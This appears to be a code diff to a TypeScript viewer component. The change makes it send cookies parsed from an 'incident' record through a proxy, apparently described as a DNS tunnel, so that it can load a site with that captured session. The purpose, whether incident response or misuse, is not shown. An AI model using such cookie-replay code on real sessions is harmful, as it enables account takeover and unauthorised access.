@@ -119,28 +119,35 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
   }, [incident.full_cookie_data, incident.cookie_data, (incident as any).cookie_excerpt, (incident as any).cookieExcerpt, incident.host]);
 
   // Fetch raw content from backend (cookies + DNS tunnel via site-proxy)
-  // Proxy automatically fetches cookies from DB using incident_id
   const fetchRawContent = async (url: string): Promise<string> => {
     const proxyIncidentId = incidentIdForProxy || incident.id;
-    console.log('[LocalProxy] Fetching raw content:', url, 'for incident:', proxyIncidentId);
+    console.log('[LocalProxy] Fetching with', cookies.length, 'parsed cookies for:', url);
     
-    // Build query params - proxy will fetch cookies from DB automatically
-    const params = new URLSearchParams({
-      url,
-      incident: proxyIncidentId,
-      rawContent: 'true'
-    });
-    
-    const response = await fetch(`${PROXY_BASE}?${params.toString()}`, {
-      method: 'GET',
+    const response = await fetch(`${PROXY_BASE}?incident=${proxyIncidentId}`, {
+      method: 'POST',
       headers: { 
         'Content-Type': 'application/json'
-      }
+      },
+      body: JSON.stringify({
+        url,
+        cookies: cookies,  // Send parsed cookies from state
+        rawContent: true
+      })
     });
     
     if (!response.ok) {
       throw new Error(`HTTP ${response.status}: ${await response.text()}`);
     }
+    
+    // Log debug headers
+    const debugCookieCount = response.headers.get('X-Debug-Cookie-Count');
+    const debugSource = response.headers.get('X-Debug-Cookie-Source');
+    const debugSessionType = response.headers.get('X-Debug-Session-Type');
+    console.log('[LocalProxy] Response:', {
+      cookieCount: debugCookieCount,
+      source: debugSource,
+      sessionType: debugSessionType
+    });
     
     return await response.text();
   };
